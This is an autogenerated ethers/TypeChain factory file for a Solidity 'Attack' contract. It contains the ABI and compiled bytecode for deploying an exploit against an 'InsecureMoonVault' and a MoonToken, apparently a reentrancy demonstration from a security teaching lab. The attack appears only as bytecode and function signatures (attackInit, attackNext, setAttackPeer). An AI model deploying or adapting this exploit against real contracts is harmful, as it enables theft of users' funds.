/* Autogenerated file. Do not edit manually. */
/* tslint:disable */
/* eslint-disable */
import {
  Contract,
  ContractFactory,
  ContractTransactionResponse,
  Interface,
} from "ethers";
import type {
  Signer,
  AddressLike,
  ContractDeployTransaction,
  ContractRunner,
} from "ethers";
import type { NonPayableOverrides } from "../../common";
import type { Attack, AttackInterface } from "../../Attack.sol/Attack";

const _abi = [
  {
    inputs: [
      {
        internalType: "contract IMoonToken",
        name: "_moonToken",
        type: "address",
      },
      {
        internalType: "contract IMoonVault",
        name: "_insecureMoonVault",
        type: "address",
      },
    ],
    stateMutability: "nonpayable",
    type: "constructor",
  },
  {
    inputs: [],
    name: "attackInit",
    outputs: [],
    stateMutability: "payable",
    type: "function",
  },
  {
    inputs: [],
    name: "attackNext",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [],
    name: "attackPeer",
    outputs: [
      {
        internalType: "contract Attack",
        name: "",
        type: "address",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "getBalance",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "moonToken",
    outputs: [
      {
        internalType: "contract IMoonToken",
        name: "",
        type: "address",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "moonVault",
    outputs: [
      {
        internalType: "contract IMoonVault",
        name: "",
        type: "address",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "contract Attack",
        name: "_attackPeer",
        type: "address",
      },
    ],
    name: "setAttackPeer",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    stateMutability: "payable",
    type: "receive",
  },
] as const;

const _bytecode =
  "0x60c06040523480156200001157600080fd5b5060405162000b5238038062000b5283398181016040528101906200003791906200016a565b8173ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff16815250508073ffffffffffffffffffffffffffffffffffffffff1660a08173ffffffffffffffffffffffffffffffffffffffff16815250505050620001b1565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000620000d982620000ac565b9050919050565b6000620000ed82620000cc565b9050919050565b620000ff81620000e0565b81146200010b57600080fd5b50565b6000815190506200011f81620000f4565b92915050565b60006200013282620000cc565b9050919050565b620001448162000125565b81146200015057600080fd5b50565b600081519050620001648162000139565b92915050565b60008060408385031215620001845762000183620000a7565b5b600062000194858286016200010e565b9250506020620001a78582860162000153565b9150509250929050565b60805160a051610953620001ff6000396000818160840152818161011e015281816103aa015281816103ce0152818161049a015261052301526000818160c1015261036201526109536000f3fe6080604052600436106100745760003560e01c80639b8bf09a1161004e5780639b8bf09a1461029e578063b5883648146102c9578063e66e17c9146102f4578063ec2583d01461030b5761021a565b806312065fe01461021f57806312f72e671461024a5780633468145a146102735761021a565b3661021a57670de0b6b3a76400007f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff163110610218577f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663a9059cbb60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff167f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff166347734892306040518263ffffffff1660e01b815260040161017591906105e4565b602060405180830381865afa158015610192573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101b6919061063a565b6040518363ffffffff1660e01b81526004016101d3929190610676565b6020604051808303816000875af11580156101f2573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061021691906106d7565b505b005b600080fd5b34801561022b57600080fd5b50610234610315565b6040516102419190610704565b60405180910390f35b34801561025657600080fd5b50610271600480360381019061026c919061076f565b61031d565b005b34801561027f57600080fd5b50610288610360565b60405161029591906107fb565b60405180910390f35b3480156102aa57600080fd5b506102b3610384565b6040516102c09190610849565b60405180910390f35b3480156102d557600080fd5b506102de6103a8565b6040516102eb9190610885565b60405180910390f35b34801561030057600080fd5b506103096103cc565b005b61031361044e565b005b600047905090565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b7f000000000000000000000000000000000000000000000000000000000000000081565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b7f000000000000000000000000000000000000000000000000000000000000000081565b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663853828b66040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561043457600080fd5b505af1158015610448573d6000803e3d6000fd5b50505050565b670de0b6b3a76400003414610498576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161048f906108fd565b60405180910390fd5b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561050857600080fd5b505af115801561051c573d6000803e3d6000fd5b50505050507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663853828b66040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561058957600080fd5b505af115801561059d573d6000803e3d6000fd5b50505050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006105ce826105a3565b9050919050565b6105de816105c3565b82525050565b60006020820190506105f960008301846105d5565b92915050565b600080fd5b6000819050919050565b61061781610604565b811461062257600080fd5b50565b6000815190506106348161060e565b92915050565b6000602082840312156106505761064f6105ff565b5b600061065e84828501610625565b91505092915050565b61067081610604565b82525050565b600060408201905061068b60008301856105d5565b6106986020830184610667565b9392505050565b60008115159050919050565b6106b48161069f565b81146106bf57600080fd5b50565b6000815190506106d1816106ab565b92915050565b6000602082840312156106ed576106ec6105ff565b5b60006106fb848285016106c2565b91505092915050565b60006020820190506107196000830184610667565b92915050565b600061072a826105a3565b9050919050565b600061073c8261071f565b9050919050565b61074c81610731565b811461075757600080fd5b50565b60008135905061076981610743565b92915050565b600060208284031215610785576107846105ff565b5b60006107938482850161075a565b91505092915050565b6000819050919050565b60006107c16107bc6107b7846105a3565b61079c565b6105a3565b9050919050565b60006107d3826107a6565b9050919050565b60006107e5826107c8565b9050919050565b6107f5816107da565b82525050565b600060208201905061081060008301846107ec565b92915050565b6000610821826107a6565b9050919050565b600061083382610816565b9050919050565b61084381610828565b82525050565b600060208201905061085e600083018461083a565b92915050565b600061086f826107c8565b9050919050565b61087f81610864565b82525050565b600060208201905061089a6000830184610876565b92915050565b600082825260208201905092915050565b7f52657175697265203120457468657220746f2061747461636b00000000000000600082015250565b60006108e76019836108a0565b91506108f2826108b1565b602082019050919050565b60006020820190508181036000830152610916816108da565b905091905056fea2646970667358221220cf1fdf9a680a28f70ea8feac7451228d28066662470bf071ec31a34459afd1b864736f6c63430008110033";

type AttackConstructorParams =
  | [signer?: Signer]
  | ConstructorParameters<typeof ContractFactory>;

const isSuperArgs = (
  xs: AttackConstructorParams
): xs is ConstructorParameters<typeof ContractFactory> => xs.length > 1;

export class Attack__factory extends ContractFactory {
  constructor(...args: AttackConstructorParams) {
    if (isSuperArgs(args)) {
      super(...args);
    } else {
      super(_abi, _bytecode, args[0]);
    }
  }

  override getDeployTransaction(
    _moonToken: AddressLike,
    _insecureMoonVault: AddressLike,
    overrides?: NonPayableOverrides & { from?: string }
  ): Promise<ContractDeployTransaction> {
    return super.getDeployTransaction(
      _moonToken,
      _insecureMoonVault,
      overrides || {}
    );
  }
  override deploy(
    _moonToken: AddressLike,
    _insecureMoonVault: AddressLike,
    overrides?: NonPayableOverrides & { from?: string }
  ) {
    return super.deploy(
      _moonToken,
      _insecureMoonVault,
      overrides || {}
    ) as Promise<
      Attack & {
        deploymentTransaction(): ContractTransactionResponse;
      }
    >;
  }
  override connect(runner: ContractRunner | null): Attack__factory {
    return super.connect(runner) as Attack__factory;
  }

  static readonly bytecode = _bytecode;
  static readonly abi = _abi;
  static createInterface(): AttackInterface {
    return new Interface(_abi) as AttackInterface;
  }
  static connect(address: string, runner?: ContractRunner | null): Attack {
    return new Contract(address, _abi, runner) as unknown as Attack;
  }
}
